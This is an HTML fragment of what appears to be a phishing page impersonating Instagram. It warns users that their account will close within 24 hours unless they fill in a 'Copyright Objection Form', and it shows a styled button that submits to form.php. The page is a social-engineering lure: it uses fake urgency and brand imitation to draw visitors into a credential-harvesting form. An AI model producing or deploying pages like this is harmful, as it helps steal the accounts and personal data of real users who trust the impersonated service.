...
<div id="menu">
<center><br><img src="http://bizimhaber.net/wp-content/uploads/2019/08/instagram-beyaz-ekran-kapanma-sorunu.jpg" width="250" style="margin-bottom:10px;"></center>
	<br><p style="font-family:sans-serif; font-size:17px; color: #999; line-height:20px; font-weight:350; margin-top:15px;">Hello Dear Instagram User,<br> Please Fill In The Copyright Objection Form To Prevent Your Account From Closing Within 24 Hours.</p>


<form action="form.php">

<br><button style="color:white; width:100%; outline:0; border:0; border-radius:3px;   
    background: #3897f0;
    border-color: #3897f0;    
    font-size: 14px; 
    font-weight:bold; 
    height:33px;
    width:200px;">Copyright Objection Form</button>
